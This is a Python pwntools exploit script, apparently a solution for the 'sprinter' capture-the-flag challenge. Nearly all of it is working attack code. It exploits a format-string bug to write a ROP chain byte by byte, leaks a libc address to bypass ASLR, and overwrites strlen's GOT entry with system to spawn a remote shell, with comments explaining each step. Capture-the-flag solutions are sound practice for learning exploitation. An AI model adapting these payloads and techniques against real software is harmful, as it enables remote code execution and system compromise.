#!/usr/bin/python2

from pwn import *
import sys

exe = ELF("vuln_patched")
libc = ELF("libc-2.31.so")
ld = ELF("./ld-2.31.so")

start = 0x00401110
diff = 0x12FA70
#write1 = 0x3afe
write1 = 0xe3afe
above = 0x24083
strlen_libc = 0x1886D0
system_libc = 0x52290
strlen_got = 0x404018
# pop_rdi = 0x 40 13   73
# strlen_got = 0x004040  18
# puts_plt = 0x0040 10 d4

context.binary = exe

g = lambda r,buffer: gdb.attach(r, gdbscript='''b *vuln+155
    c
    ni
    echo ------------rop chain--------\n
    x/7gx {}+0x118'''.format(hex(buffer)))
g2 = lambda r,buffer: gdb.attach(r, gdbscript='''b *vuln+155
    c
    ni
    echo -------------ret addr--------\n
    x/gx {}+118
    echo ----------strlen got.plt-----\n
    x/gx 0x404018'''.format(hex(buffer)))

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("sprinter.chal.idek.team", 1337)

    return r

def send_msg(r, payload):
    r.sendlineafter(': ', payload)

"""
TARGET ROP CHAIN                    OFF                     OFF
                                        0x0000000000401371  118 1: pop rsi, pop r15, ret gadget. to place null in rsi
0x7fff70cbb720: 0x0000000000000000  120 0x0000414141414141  128     0x414141414141 because it can be anything, it doesnt matter
0x7fff70cbb730: 0x0000000000401373  130 0x0000000000404018  138 2: pop rdi; ret gadget, pops the plt.got address for strlen in rdi
0x7fff70cbb740: 0x00000000004010d4  140 0x0000000000401110  148 3: call printf in plt and restart

BEFORE WRITES
0x7fff145c05f0: 0x00007fff145c0600      0x00000000004012fd
0x7fff145c0600: 0x0000000000000000      0x00007fd880a5e083
0x7fff145c0610: 0x00007fd880c5b620      0x00007fff145c06f8
0x7fff145c0620: 0x0000000100000000      0x00000000004012af


#purpose:
this leaks the libc addres for strlen, bypassing aslr. 
without this blindly overwriting the 2nd and 3rd least
significant bytes of strlen is too random. 1/(16^3) = 1/4096
it could techincally work in principle, but is a bad attack
specifics of the vulnerability below
"""
def leak_libc(r):
    r.recvuntil('at 0x')
    buffer = int(r.recv(12),16)
    log.info("Buffer: {}".format(hex(buffer)))
    prefix = "%-10x"+"A"*6+"\x00" + "B"*20 # use the null byte to stop strlen and strchr from detecting the n and length of my payload
                                           # the %-10x will write \x20(space) to the first 10 bytes
                                           # this overwrites the null byte while sprintf is still being process
                                           # this makes it so the %n's are interpreted as format string characters and the writes trigger!
                                           # the 6 A's place a total of 16 chars in the buffer, which is important for the writes, if you look below the first byte written in 0x10 
                                           # the B's give padding so the %n's are not overwritten
    
    # manually write the format string to write bytes byte by byte for the rop. see above comment for the completed chain
    # have to be cognecent of the padding, and that it doesn't overwrite the ROP chain, which is why it goes byte by byte 
    prefix += "%23$hhn%24$hhnA%25$hhnAA%26$hhn%27$hhn%5x%28$n%40x%29$n%30$hhn%31$n%32$n%49x%33$hhnAA%34$hhn%97x%35$hhn"

    # addresses to write to in order
    suffix =  p64(buffer+0x141) #10
    suffix += p64(buffer+0x148) #10 
    suffix += p64(buffer+0x149) #11 
    suffix += p64(buffer+0x119) #13
    suffix += p64(buffer+0x131) #13
    suffix += p64(buffer+0x138) #18 
    suffix += p64(buffer+0x132) #40 needs n 
    suffix += p64(buffer+0x139) #40 
    suffix += p64(buffer+0x13a) #40 needs n
    suffix += p64(buffer+0x142) #40 needs n
    suffix += p64(buffer+0x118) #71 
    suffix += p64(buffer+0x130) #73
    suffix += p64(buffer+0x140) #d4
    #g(r,buffer) #uncomment to check the out the rop chain!
    payload = prefix + "\x00"*(248 - (len(prefix)+len(suffix)))+  suffix # pad and create payload
    send_msg(r,payload)
    libc = u64(r.recv(6) + "\x00\x00")-strlen_libc  #parse libc leak
    return buffer,libc


"""
with the libc leak, overwriting strlen in the got.plt is much easier in comparison, the only difference is the 2nd and 3rd
least significant bytes are unknown, so the chain has to be generated slightly dynamically. 

why strlen?
strlen is the target for overwrite because it takes only on paramater, and that parameter is user controlled(the buffer)
system also takes only a single char* argument, which is why it works
"""
def overwrite_got(r,libc_base):
    r.recvuntil('at 0x')
    buffer = int(r.recv(12),16)
    log.info("NEW Buffer: {}".format(hex(buffer)))


    to_write = hex(libc_base+system_libc) # calc the address we want to write, cast to a hex-string which is how I like to grab specific bytes 
    byte1 = 0x90
    byte2 = int(to_write[-4:-2],16) # grab the 2nd least significant byte
    byte3 = int(to_write[-6:-4],16) # grab the 3rd least significant byte
    bytesl = [(byte1,1),(byte2,2),(byte3,3)] #create a list of bytes and their position
    bytesl.sort() #sort based on size, so I can pad in the correct order


    prefix = "%-10x"+"A"*6+"\x00" + "B"*20 # same start, if it ain't broke don't fix it
    prefix += "%31$hhnA%32$hhn" #writes for the return address, since these are small 0x10 and 0x11

    #generate the rest of the chain using the pre calculated array 
    count = 17 # manual writes end at 0x11 or 17
    for byte in bytesl:
        prefix += "%{}x%{}$hhn".format(byte[0]-count,36-byte[1])
        count = byte[0]

    log.info("format string chain: {}".format(prefix))
    
    # addresses to write to
    suffix =  p64(buffer+0x118) #10
    suffix += p64(buffer+0x119) #11
    suffix += p64(strlen_got+2) #unknown
    suffix += p64(strlen_got+1) #unknown
    suffix += p64(strlen_got) #90
    
    payload = prefix + "\x00"*(248 - (len(prefix)+len(suffix)))+  suffix
    #g2(r,buffer) #uncomment to view the write to plt.got
    send_msg(r,payload)
    return

def main():
    #some logic to make running it not a pain in the ass
    while True:
        r = conn()
        try:
            buffer,libc_leak = leak_libc(r)
            log.info("LIBC_leak: {}".format(hex(libc_leak)))
            #g(r,buffer)
            overwrite_got(r,libc_leak)
            lol = r.recvuntil(':')
            log.info("SUCCESS! types sh to spawn a shell")
            r.interactive()
            break
        except KeyboardInterrupt:
            break
        except:
            r.close()


if __name__ == "__main__":
    main()